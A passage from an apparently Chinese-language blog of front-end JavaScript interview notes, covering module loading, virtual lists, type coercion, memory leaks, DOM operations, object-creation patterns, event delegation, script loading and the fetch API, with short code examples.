在依赖模块加载完成后并不执行，只是下载而已，等到所有的依赖模块都加载好后，进入回调函数逻辑，遇到 require 语句的时候才执行对应的模块，这样模块的执行顺序就和书写的顺序一致。</p><h3 id="requireJS-的核心原理是什么？"><a href="#requireJS-的核心原理是什么？" class="headerlink" title="* requireJS 的核心原理是什么？"></a>* requireJS 的核心原理是什么？</h3><p>require.js 的核心原理是通过动态创建 script 脚本来异步引入模块，然后对每个脚本的 load 事件进行监听，如果每个脚本都加载完成了，再调用回调函数。</p><h3 id="require-模块引入的查找方式？"><a href="#require-模块引入的查找方式？" class="headerlink" title="* require 模块引入的查找方式？"></a>* require 模块引入的查找方式？</h3><p>当 Node 遇到 require(X) 时，按下面的顺序处理。</p><p>（1）如果 X 是内置模块（比如 require(‘http’)）<br>　　a. 返回该模块。<br>　　b. 不再继续执行。</p><p>（2）如果 X 以 “./“ 或者 “/“ 或者 “../“ 开头<br>　　a. 根据 X 所在的父模块，确定 X 的绝对路径。<br>　　b. 将 X 当成文件，依次查找下面文件，只要其中有一个存在，就返回该文件，不再继续执行。<br>    X<br>    X.js<br>    X.json<br>    X.node</p><p>　　c. 将 X 当成目录，依次查找下面文件，只要其中有一个存在，就返回该文件，不再继续执行。<br>    X/package.json（main字段）<br>    X/index.js<br>    X/index.json<br>    X/index.node</p><p>（3）如果 X 不带路径<br>　　a. 根据 X 所在的父模块，确定 X 可能的安装目录。<br>　　b. 依次在每个目录中，将 X 当成文件名或目录名加载。</p><p>（4）抛出 “not found”</p><h2 id="一个列表有-100000-个数据，怎么渲染？（高频）"><a href="#一个列表有-100000-个数据，怎么渲染？（高频）" class="headerlink" title="一个列表有 100000 个数据，怎么渲染？（高频）"></a>一个列表有 100000 个数据，怎么渲染？（高频）</h2><p>需要思考的问题：该处理是否必须同步完成？数据是否必须按顺序完成？<a href="https://juejin.cn/post/6986237263164211207">https://juejin.cn/post/6986237263164211207</a></p><p>解决办法：</p><p>（1）<strong>虚拟列表</strong>，按需显示的一种实现，只对可见区域进行渲染，对非可见区域中的数据不渲染或部分渲染，从而达到极高的渲染性能。<a href="https://juejin.cn/post/6844903982742110216">https://juejin.cn/post/6844903982742110216</a></p><p>（2）使用<strong>懒加载</strong>的方法，每次加载一部分数据，其余数据当需要使用时再去加载。</p><p>（3）使用<strong>数组分块（时间分片？）技术</strong>，基本思路是为要处理的项目创建一个队列，然后设置定时器每过一段时间取出一部分数据，然后再使用定时器取出下一个要处理的项目进行处理，接着再设置另一个定时器。<a href="https://juejin.cn/post/6844903938894872589">https://juejin.cn/post/6844903938894872589</a></p><h3 id="实现虚拟列表（to-understand）"><a href="#实现虚拟列表（to-understand）" class="headerlink" title="实现虚拟列表（to understand）"></a>实现虚拟列表（to understand）</h3><p>具体见<a href="https://zhuanlan.zhihu.com/p/34585166%E3%80%81">https://zhuanlan.zhihu.com/p/34585166、</a> <a href="https://juejin.cn/post/6844903982742110216">https://juejin.cn/post/6844903982742110216</a></p><p><strong>如何确定当前虚拟列表渲染的元素的index？</strong>滚动位置 scrollTop/列表每项高度</p><h2 id="js-中的命名规则"><a href="#js-中的命名规则" class="headerlink" title="js 中的命名规则"></a>js 中的命名规则</h2><p>（1）第一个字符必须是字母、下划线（_）或美元符号（$）<br>（2）余下的字符可以是下划线、美元符号或任何字母或数字字符</p><p>一般推荐使用驼峰法来对变量名进行命名，这样可以与 ECMAScript 内置的函数和对象命名格式保持一致。</p><h2 id="JavaScript-类数组对象的定义？"><a href="#JavaScript-类数组对象的定义？" class="headerlink" title="JavaScript 类数组对象的定义？"></a>JavaScript 类数组对象的定义？</h2><p>一个拥有 length 属性和若干索引属性的对象就可以被称为类数组对象，类数组对象和数组类似，但是不能调用数组的方法。</p><p>常见的类数组对象有 <strong>argumentsm</strong> 和 <strong>DOM 方法的返回结果</strong>，<strong>一个函数</strong>也可以被看作m是类数组对象，因为它含有 length 属性值，代表可接收的参数个数。常见的<strong>类数组转换为数组的方法</strong>：</p><p>（1）通过 call 调用数组的 slice 方法来实现转换 <code>Array.prototype.slice.call(arrayLike);</code>。</p><p>（2）通过 call 调用数组的 splice 方法来实现转换 <code>Array.prototype.splice.call(arrayLike, 0);</code>。</p><p>（3）通过 apply 调用数组的 concat 方法来实现转换 <code>Array.prototype.concat.apply([], arrayLike);</code>。</p><p>（4）通过 Array.from 方法来实现转换 <code>Array.from(arrayLike);</code>。</p><h2 id="说几条写-JavaScript-的基本规范？"><a href="#说几条写-JavaScript-的基本规范？" class="headerlink" title="说几条写 JavaScript 的基本规范？"></a>说几条写 JavaScript 的基本规范？</h2><p>（1）一个函数作用域中所有的变量声明应该尽量提到函数首部，用一个 var 声明，<strong>不允许出现两个连续的 var 声明</strong>。声明时，如果变量没有值，应该给该变量赋值对应类型的<strong>初始值</strong>，便于他人阅读代码。</p><p>（2）代码中出现地址、时间等字符串时需要使用<strong>常量代替</strong>。</p><p>（3）在进行比较的时候吧，尽量使用**’===’, ‘!==’代替’==’, ‘!=’**。</p><p>（4）<strong>不要在内置对象的原型上添加方法</strong>，如 Array, Date。</p><p>（5）switch 语句必须带有 <strong>default 分支</strong>。</p><p>（6）for 循环必须使用<strong>大括号</strong>。</p><p>（7）if 语句必须使用<strong>大括号</strong>。</p><h2 id="转换规则"><a href="#转换规则" class="headerlink" title="转换规则"></a>转换规则</h2><h3 id="To-字符串"><a href="#To-字符串" class="headerlink" title="To 字符串"></a>To 字符串</h3><p>抽象操作 ToString 负责处理非字符串到字符串的强制类型转换。</p><p>（1）Null 和 Undefined 类型 ，null 转换为 “null”，undefined 转换为 “undefined”，</p><p>（2）Boolean 类型，true 转换为 “true”，false 转换为 “false”。</p><p>（3）Number 类型的值直接转换，不过那些极小和极大的数字会使用指数形式。</p><p>（4）Symbol 类型的值直接转换，但是只允许显式强制类型转换，使用隐式强制类型转换会产生错误。</p><p>（5）对普通对象来说，除非自行定义 toString() 方法，否则会调用 toString()（Object.prototype.toString()）来返回内部属性 [[Class]] 的值，如”[object Object]”。如果对象有自己的 toString() 方法，字符串化时就会调用该方法并使用其返回值。</p><h3 id="To-数字值"><a href="#To-数字值" class="headerlink" title="To 数字值"></a>To 数字值</h3><p>抽象操作 ToNumber：</p><p>（1）Undefined 类型的值转换为 NaN。</p><p>（2）Null 类型的值转换为 0。</p><p>（3）Boolean 类型的值，true 转换为 1，false 转换为 0。</p><p>（4）String 类型的值转换如同使用 Number() 函数进行转换，如果包含非数字值则转换为 NaN，空字符串为 0。</p><p>（5）Symbol 类型的值<strong>不能转换</strong>为数字，会报错。</p><p>（6）对象（包括数组）会首先被转换为相应的基本类型值，如果返回的是非数字的基本类型值，则再遵循以上规则将其强制转换为数字。</p><p>为了将值转换为相应的基本类型值，抽象操作 ToPrimitive 会首先检查该值是否有<code>valueOf()</code>方法，如果有并且返回基本类型值，就使用该值进行强制类型转换。如果没有就使用<code>toString() </code>的返回值来进行强制类型转换。如果 <code>valueOf()</code> 和<code>toString()</code>均不返回基本类型值，会产生 TypeError 错误。</p><h3 id="To-布尔值"><a href="#To-布尔值" class="headerlink" title="To 布尔值"></a>To 布尔值</h3><p>抽象操作 ToBoolean，以下这些是假值：</p><ul><li> undefined</li><li> null</li><li> false</li><li> +0、-0 和 NaN</li><li> “”</li></ul><p>假值的布尔强制类型转换结果为 false，假值列表以外的都是真值。</p><h3 id="布尔值的隐式强制类型转换？"><a href="#布尔值的隐式强制类型转换？" class="headerlink" title="布尔值的隐式强制类型转换？"></a>布尔值的隐式强制类型转换？</h3><ol><li>if (..) 语句中的条件判断表达式。</li><li>for ( .. ; .. ; .. ) 语句中的条件判断表达式（第二个）。</li><li>while (..) 和 do..while(..) 循环中的条件判断表达式。</li><li>? : 中的条件判断表达式。</li><li>逻辑运算符 ||（逻辑或）和 &amp;&amp;（逻辑与）左边的操作数（作为条件判断表达式）。</li></ol><p>例子：</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="built_in">console</span>.log(([])?<span class="literal">true</span>:<span class="literal">false</span>); </span><br><span class="line"><span class="built_in">console</span>.log(([]==<span class="literal">false</span>?<span class="literal">true</span>:<span class="literal">false</span>)); </span><br><span class="line"><span class="built_in">console</span>.log((&#123;&#125;==<span class="literal">false</span>)?<span class="literal">true</span>:<span class="literal">false</span>) </span><br></pre></td></tr></table></figure><p>题目的类型转换结果：</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="built_in">Boolean</span>([]); <span class="comment">//true</span></span><br><span class="line"><span class="built_in">Number</span>([]); <span class="comment">//0</span></span><br><span class="line"><span class="built_in">Number</span>(&#123;&#125;); <span class="comment">// NaN</span></span><br><span class="line"><span class="built_in">Number</span>(<span class="literal">false</span>); <span class="comment">//0</span></span><br></pre></td></tr></table></figure><p>因此：</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="built_in">console</span>.log(([])?<span class="literal">true</span>:fasle);<span class="comment">// =&gt; console.log((true)?true:false);</span></span><br><span class="line"><span class="built_in">console</span>.log([]==<span class="literal">false</span>?<span class="literal">true</span>:<span class="literal">false</span>); <span class="comment">// =&gt; console.log(0==0?true:false);</span></span><br><span class="line"><span class="built_in">console</span>.log((&#123;&#125;==<span class="literal">false</span>)?<span class="literal">true</span>:<span class="literal">false</span>); <span class="comment">// =&gt; console.log((NaN==0)?true:false);</span></span><br></pre></td></tr></table></figure><h3 id="对象转原始类型（拆箱转换）"><a href="#对象转原始类型（拆箱转换）" class="headerlink" title="对象转原始类型（拆箱转换）"></a>对象转原始类型（拆箱转换）</h3><p>对象在转换类型的时候，会调用内置的 <code>[[ToPrimitive]]</code> 函数，对于该函数来说，算法逻辑如下：</p><ul><li>如果已经是原始类型，不需要转换</li><li>如果转字符串类型就调用 <code>x.toString()</code>，转换为基础类型的话就返回转换的值。不是字符串的话就先调用 <code>valueOf</code>，结果不是 基础类型 再调用 <code>toString</code>。</li><li>调用 <code>x.valueOf()</code>，如果转换为基础类型，就返回转换的值</li><li>如果都没有返回原始类型，就会报错</li></ul><h3 id="四则运算符"><a href="#四则运算符" class="headerlink" title="四则运算符"></a>四则运算符</h3><p>加法运算符不同于其他几个运算符，它有以下几个特点：</p><ul><li>运算中其中一方为字符串，那么就会把另一方也转换为字符串</li><li>如果一方不是字符串或者数字，那么会将它转换为数字或者字符串</li></ul><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span> + <span class="string">&#x27;1&#x27;</span> <span class="comment">// &#x27;11&#x27;</span></span><br><span class="line"><span class="literal">true</span> + <span class="literal">true</span> <span class="comment">// 2</span></span><br><span class="line"><span class="number">4</span> + [<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>] <span class="comment">// &quot;41,2,3&quot; 将数组通过 toString 转为字符串 1,2,3</span></span><br></pre></td></tr></table></figure><p>另外对于加法还需要注意：</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="string">&#x27;a&#x27;</span> + + <span class="string">&#x27;b&#x27;</span> <span class="comment">// -&gt; &quot;aNaN&quot;，因为 + &#x27;b&#x27; 等于 NaN，所以结果为 &quot;aNaN&quot;</span></span><br></pre></td></tr></table></figure><h3 id="比较运算符"><a href="#比较运算符" class="headerlink" title="比较运算符"></a>比较运算符</h3><ol><li>如果是对象，就通过 <code>toPrimitive</code> 转换对象</li><li>如果是字符串，就通过 <code>unicode</code> 字符索引来比较</li></ol><h3 id="操作符的强制类型转换规则？"><a href="#操作符的强制类型转换规则？" class="headerlink" title="== 操作符的强制类型转换规则？"></a>== 操作符的强制类型转换规则？</h3><p>（1）字符串和数字之间的相等比较，将字符串转换为数字之后再进行比较。</p><p>（2）其他类型和布尔类型之间的相等比较，先将布尔值转换为数字后，再应用其他规则进行比较。</p><p>（3）null 和 undefined 比较，结果为真。其他值和它们进行比较都返回假值。</p><p>（4）对象和非对象之间的相等比较，对象先调用 ToPrimitive 抽象操作后，再进行比较。</p><p>（5）如果一个操作值为 NaN ，则相等比较返回 false 。</p><p>（6）如果两个操作值都是对象，则比较它们是不是指向同一个对象。如果两个操作数都指向同一个对象，则相等操作符返回 true，否则，返回 false。</p><h2 id="JavaScript-中内存泄漏的几种情况？"><a href="#JavaScript-中内存泄漏的几种情况？" class="headerlink" title="JavaScript 中内存泄漏的几种情况？"></a>JavaScript 中内存泄漏的几种情况？</h2><ol><li><strong>意外的全局变量</strong>（使用严格模式可以避免）：使用未声明的变量，而意外的创建了一个全局变量，这个变量一直留在内存中无法被回收。</li><li>被遗忘的<strong>计时器或回调函数</strong>。设置了 setInterval 定时器，而忘记取消它，如果循环函数有对外部变量的引用，那么这个变量会一直留在内存中，无法被回收。</li><li><strong>闭包</strong>。不合理的使用闭包，导致某些变量一直被留在内存当中。</li><li><strong>脱离 DOM 的引用</strong>。获取一个 DOM 元素的引用，而后这个元素被删除，由于一直保留了对这个元素的引用，所以它也无法被回收。</li><li>使用事件监听 addEventListener 未 remove</li></ol><h2 id="什么是-DOM-和-BOM？"><a href="#什么是-DOM-和-BOM？" class="headerlink" title="什么是 DOM 和 BOM？"></a>什么是 DOM 和 BOM？</h2><p>DOM：<strong>文档对象模型</strong>，把文档当做一个对象来对待，主要定义了处理网页内容的方法和接口。</p><p>BOM：<strong>浏览器对象模型</strong>，把浏览器当做一个对象来对待，主要定义了与浏览器进行交互的法和接口。BOM 的核心是 window，而 window 对象具有双重角色，它既是通过 js 访问浏览器窗口的一个接口，又是一个 Global 对象。这意味着<strong>在网页中定义的任何对象，变量和函数，都作为全局对象的一个属性或者方法存在</strong>。window 对象含有 location 对象、navigator 对象、screen 对象等子对象，并且 DOM 最根本的 document 对象也是 window 的子对象。</p><h3 id="DOM-节点操作"><a href="#DOM-节点操作" class="headerlink" title="DOM 节点操作"></a>DOM 节点操作</h3><p>（1）创建新节点</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">createDocumentFragment(node);</span><br><span class="line">createElement(node);</span><br><span class="line">createTextNode(text);</span><br></pre></td></tr></table></figure><p>（2）添加、移除、替换、插入</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">appendChild(node)</span><br><span class="line">removeChild(node)</span><br><span class="line">replaceChild(<span class="keyword">new</span>,old)</span><br><span class="line">insertBefore(<span class="keyword">new</span>,old)</span><br></pre></td></tr></table></figure><p>（3）查找</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">getElementById();</span><br><span class="line">getElementsByName();</span><br><span class="line">getElementsByTagName();</span><br><span class="line">getElementsByClassName();</span><br><span class="line">querySelector();</span><br><span class="line">querySelectorAll();</span><br></pre></td></tr></table></figure><p>（4）属性操作</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">getAttribute(key);</span><br><span class="line">setAttribute(key, value);</span><br><span class="line">hasAttribute(key);</span><br><span class="line">removeAttribute(key);</span><br></pre></td></tr></table></figure><h2 id="javascript-创建对象的几种方式？（高频）"><a href="#javascript-创建对象的几种方式？（高频）" class="headerlink" title="javascript 创建对象的几种方式？（高频）"></a>javascript 创建对象的几种方式？（高频）</h2><p>（1）<strong>工厂</strong>模式。原理是<strong>用函数来封装创建对象的细节，从而通过调用函数达到复用</strong>。</p><p>缺点：对象无法识别，因为所有的实例都指向一个原型。</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">createPerson</span>(<span class="params">name</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> o = <span class="keyword">new</span> <span class="built_in">Object</span>();</span><br><span class="line">    o.name = name;</span><br><span class="line">    o.getName = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="built_in">this</span>.name);</span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="keyword">return</span> o;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> person1 = createPerson(<span class="string">&#x27;kevin&#x27;</span>);</span><br></pre></td></tr></table></figure><p>（2）<strong>构造函数</strong>模式。js 中每一个函数都可以作为构造函数，只要一个函数通过 new 调用，就可以称为构造函数。执行构造函数首先会创建一个对象，然后将对象的原型指向构造函数的 prototype 属性，然后将执行上下文中的 this 指向这个对象，最后再执行整个函数，如果返回值不是对象，则返回新建的对象。</p><p><strong>优点</strong>：实例可以识别为一个特定的类型。</p><p><strong>缺点</strong>：每次创建实例时，每个方法都要被创建一次，浪费不必要的内存空间。</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Person</span>(<span class="params">name</span>) </span>&#123;</span><br><span class="line">    <span class="built_in">this</span>.name = name;</span><br><span class="line">    <span class="built_in">this</span>.getName = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="built_in">this</span>.name);</span><br><span class="line">    &#125;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> person1 = <span class="keyword">new</span> Person(<span class="string">&#x27;kevin&#x27;</span>);</span><br></pre></td></tr></table></figure><p>（3）<strong>原型</strong>模式。每一个函数都有一个 prototype 属性，包含了通过构造函数创建的所有实例都能共享的属性和方法。因此可以使用原型对象来添加公用属性和方法，从而实现代码的复用。</p><p><strong>优点</strong>：方法不会重新创建。</p><p><strong>缺点</strong>： 1. 所有的属性和方法都共享。 2. 不能初始化参数。</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Person</span>(<span class="params">name</span>) </span>&#123;&#125;</span><br><span class="line"></span><br><span class="line">Person.prototype.name = <span class="string">&#x27;keivn&#x27;</span>;</span><br><span class="line">Person.prototype.getName = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="built_in">this</span>.name);</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> person1 = <span class="keyword">new</span> Person();</span><br><span class="line"></span><br><span class="line"><span class="comment">// 原型模式优化</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Person</span>(<span class="params">name</span>) </span>&#123;&#125;</span><br><span class="line"></span><br><span class="line">Person.prototype = &#123;</span><br><span class="line">    <span class="comment">// 实例可以通过constructor属性找到所属构造函数</span></span><br><span class="line">    <span class="attr">constructor</span>: Person,</span><br><span class="line">    <span class="attr">name</span>: <span class="string">&#x27;kevin&#x27;</span>,</span><br><span class="line">    <span class="attr">getName</span>: <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="built_in">this</span>.name);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> person1 = <span class="keyword">new</span> Person();</span><br><span class="line"><span class="comment">// 优点：封装性好了一点</span></span><br><span class="line"><span class="comment">// 缺点：原型模式该有的缺点还是有</span></span><br></pre></td></tr></table></figure><p>（4）<strong>组合使用</strong>构造函数模式和原型模式。这是创建自定义类型的最常见方式，通过构造函数来初始化对象的属性，通过原型对象来实现函数方法的复用。</p><p><strong>缺点</strong>：对于代码的封装性不够好。</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Person</span>(<span class="params">name</span>) </span>&#123;</span><br><span class="line">    <span class="built_in">this</span>.name = name;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">Person.prototype = &#123;</span><br><span class="line">    <span class="attr">constructor</span>: Person,</span><br><span class="line">    <span class="attr">getName</span>: <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="built_in">this</span>.name);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> person1 = <span class="keyword">new</span> Person();</span><br></pre></td></tr></table></figure><p>（5）<strong>动态原型</strong>模式。将原型方法赋值的创建过程移动到了构造函数的内部，通过对属性是否存在的判断，实现仅在第一次调用函数时对原型对象赋值一次的效果。</p><p><strong>优点</strong>：很好地对上面的混合模式进行了封装。</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Person</span>(<span class="params">name</span>) </span>&#123;</span><br><span class="line">    <span class="built_in">this</span>.name = name;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">typeof</span> <span class="built_in">this</span>.getName != <span class="string">&quot;function&quot;</span>) &#123;</span><br><span class="line">        Person.prototype.getName = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">            <span class="built_in">console</span>.log(<span class="built_in">this</span>.name);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> person1 = <span class="keyword">new</span> Person();</span><br></pre></td></tr></table></figure><p>（6）<strong>寄生构造函数</strong>模式。寄生构造函数模式就是比工厂模式在创建对象时多使用一个new。这样既不用修改原来的构造函数，也达到了扩展对象的目的。</p><p><strong>缺点</strong>：和工厂模式一样，无法实现对象的识别。</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Person</span>(<span class="params">name</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> o = <span class="keyword">new</span> <span class="built_in">Object</span>();</span><br><span class="line">    o.name = name;</span><br><span class="line">    o.getName = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="built_in">this</span>.name);</span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="keyword">return</span> o;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> person1 = <span class="keyword">new</span> Person(<span class="string">&#x27;kevin&#x27;</span>);</span><br><span class="line"><span class="built_in">console</span>.log(person1 <span class="keyword">instanceof</span> Person) <span class="comment">// false</span></span><br><span class="line"><span class="built_in">console</span>.log(person1 <span class="keyword">instanceof</span> <span class="built_in">Object</span>)  <span class="comment">// true</span></span><br></pre></td></tr></table></figure><h2 id="JavaScript-遍历对象属性的几种方式？"><a href="#JavaScript-遍历对象属性的几种方式？" class="headerlink" title="JavaScript 遍历对象属性的几种方式？"></a>JavaScript 遍历对象属性的几种方式？</h2><p>两个因素会影响对象属性的遍历：</p><p>（1）对象属性的属性描述符的 [[Enumerable]] 特性为 true（可枚举）才能被 for-in 访问；</p><p>（2）如果在对象本身没有找到属性，接下来会在原型链上查找，访问属性时会沿着整个原型链从下到上查找属性。</p><p><strong>遍历：</strong></p><ol><li><p>遍历可枚举的、<strong>自身</strong>的属性：</p><ul><li><p>Object.keys()：返回可枚举、自身的属性，再用 for..of 对返回的数组进行遍历。</p></li><li><p>for..in + hasOwnProperty()：for..in得到可枚举、自身+继承的属性，再用 hasOwnProperty() 过滤继承属性</p></li></ul></li><li><p>遍历所有自身的属性：Object.getOwnPropertyNames()</p></li><li><p>遍历可枚举的、自身+继承的属性：for..in</p></li></ol><p><strong>遍历次序：</strong></p><ol><li>数值键，按照从小到大的顺序排列；</li><li>字符串键，按照加入时间顺序，升序排列；</li><li>Symbol键，按照时间顺序，升序排列。</li></ol><h2 id="事件委托是什么？"><a href="#事件委托是什么？" class="headerlink" title="事件委托是什么？"></a>事件委托是什么？</h2><p><strong>本质</strong>：利用浏览器事件冒泡的机制。因为事件在冒泡过程中会上传到父节点，并且父节点可以通过事件对象获取到目标节点，因此可以把子节点的监听函数定义在父节点上，由父节点的监听函数统一处理多个子元素的事件。</p><p>使用事件委托，就不必为每一个子元素都绑定一个监听事件，<strong>减少了内存消耗</strong>。并且还可以实现<strong>事件的动态绑定</strong>，比如新增一个子节点，并不需要单独地为它添加一个监听事件，它所发生的事件会交给父元素中的监听函数来处理。</p><p><a href="##%E5%AE%9E%E7%8E%B0%E4%B8%80%E4%B8%AA%E4%BA%8B%E4%BB%B6%E5%A7%94%E6%89%98">=&gt;实现事件委托</a></p><h3 id="如何绑定事件？"><a href="#如何绑定事件？" class="headerlink" title="如何绑定事件？"></a>如何绑定事件？</h3><ol><li><p>内联：在一个元素上直接绑定 onclick 事件，此事件为 DOM 0 级标准，优先级最高。</p><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;button&quot;</span> <span class="attr">value</span>=<span class="string">&quot;按钮&quot;</span> <span class="attr">onclick</span>=<span class="string">&quot;alert(1);&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure></li><li><p>对象.事件形式：也是 DOM 0 级标准。</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> bt = <span class="built_in">document</span>.getElementsBytagname(<span class="string">&quot;input&quot;</span>)[<span class="number">0</span>];</span><br><span class="line">bt.onclick = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">alert(<span class="number">1</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>前两种的弊端：一个元素只能添加一个事件。</strong></p></li><li><p>事件监听 addEventListener 的方式：第三个参数：是否捕获。默认是 false（即为冒泡）</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">bt.addEventListener(<span class="string">&quot;click&quot;</span>, <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">alert(<span class="number">1</span>)</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure></li></ol><h2 id="js-延迟加载的方式有哪些？"><a href="#js-延迟加载的方式有哪些？" class="headerlink" title="js 延迟加载的方式有哪些？"></a>js 延迟加载的方式有哪些？</h2><p>js 延迟加载，也就是等页面加载完成之后再加载 JavaScript 文件。 js 延迟加载有助于提高页面加载速度，一般有以下几种方式：</p><ul><li>defer 属性</li><li>async 属性</li><li>动态创建 DOM 方式</li><li>使用 setTimeout 延迟方法</li><li>让 JS 最后加载</li></ul><h3 id="defer-和-async-的区别"><a href="#defer-和-async-的区别" class="headerlink" title="defer 和 async 的区别?"></a>defer 和 async 的区别?</h3><ul><li>两者都是异步去加载外部JS文件，不会阻塞DOM解析</li><li>async 是在外部JS加载完成后，浏览器空闲时，<strong>load 事件触发前</strong>执行，标记为async的脚本并不保证按照指定他们的先后顺序执行，该属性对于内联脚本无作用 (即没有src属性的脚本）。</li><li>defer 是在JS加载完成后，整个文档解析完成后，<strong>触发 <code>DOMContentLoaded</code> 事件前</strong>执行，如果缺少 <code>src</code> 属性（即内嵌脚本），该属性不应被使用，因为不起作用。</li></ul><h3 id="了解Axios拦截器的内部实现吗？"><a href="#了解Axios拦截器的内部实现吗？" class="headerlink" title="了解Axios拦截器的内部实现吗？"></a>了解Axios拦截器的内部实现吗？</h3><p>不会 <a href="https://juejin.cn/post/6994814510494138381">https://juejin.cn/post/6994814510494138381</a></p><h2 id="fetch-怎么使用，优缺点？（to-understand）"><a href="#fetch-怎么使用，优缺点？（to-understand）" class="headerlink" title="fetch 怎么使用，优缺点？（to understand）"></a>fetch 怎么使用，优缺点？（to understand）</h2><p>参考自<a href="https://segmentfault.com/a/1190000039808625">面试 | Ajax，fetch，axios的超高频面试题</a></p><p>fetch：是 http 的数据请求方式，是 XMLHttpRequest 的一种代替方案，没有使用到 XMLHttpRequest 这个类。fetch 不是 ajax，而是原生的 js。fetch() 使用 Promise，不使用回调函数。fetch 是 <strong>ES8</strong> 中新增的 api，兼容性不是很好。</p><ul><li>fetch() 采用模块化设计，API 分散在 Response 对象、Request 对象、Headers 对象上。</li><li>fetch() 通过数据流（Stream 对象）处理数据，对于请求大文件或者网速慢的场景相当有用。XMLHttpRequest 没有使用数据流，所有的请求都必须完成后才拿到。</li><li>在默认情况下 fetch 不会接受或者发送 cookies。</li></ul><p><strong>fetch(url, optionObj) 基本使用</strong></p><ul><li>接收第一个参数为请求的 url，默认的请求方式是 get。</li><li>第二个是可选参数 optionObj，可以控制不同配置的属性，比如 method：属性是字符串。headers: 一个对象，可以设定 http 的请求头。body: POST 请求的数据体，属性也是字符串。credentials 表示是否可以携带 cookie，includes表示是否同源都包含 cookie。</li><li>fetch 参数没有同步的设定，因为 fetch 是基于  promise 封装的本身就是异步。</li><li>fetch 虽然使用的是 promise 封装的，但是 catch 函数不能直接的捕获到错误，需要在第一个 then 函数内做些操作。</li></ul><blockquote><p>fetch 发送 post请求时，当发生的是跨域请求，fetch 会先发送一个 OPTIONS 请求，来确认服务器是否允许接受请求，这个请求主要是用来询问服务器是否允许修改header头等一些操作。服务器同意后返回 204，才会发送真正的请求。没有发生跨域的情况下不会产生两次请求。</p></blockquote><p><strong>fetch 的三个模块</strong></p><ul><li><code>Response</code> 模块：<code>fetch</code> 请求发送后，会得到一个服务器的响应 <code>response</code>，这个响应对于着 http 的回应。</li><li><code>Request</code> 模块：这是用于请求服务器的模块，上面提到的 <code>data, header, method</code> 都是 <code>Request</code> 模块的属性。</li><li><code>Headers</code>，这是一个在 <code>Response.headers</code>上的属性用于操控响应头的信息。</li></ul><p><strong>优点</strong>：fetch 使用的是 promise，没有回调地狱的问题</p><p><strong>缺点</strong>：</p><ul><li>fetch 的 get/head 请求不能设置 body 属性。</li><li>fetch 请求后，服务器返回的状态码无论是多少，都不认为失败，即使用 catch 也不能直接捕捉到错误，需要在第一个 then 中做一些处理。</li></ul><h2 id="js-语句末尾分号是否可以省略？"><a href="#js-语句末尾分号是否可以省略？" class="headerlink" title="js 语句末尾分号是否可以省略？"></a>js 语句末尾分号是否可以省略？</h2><p>在 ECMAScript 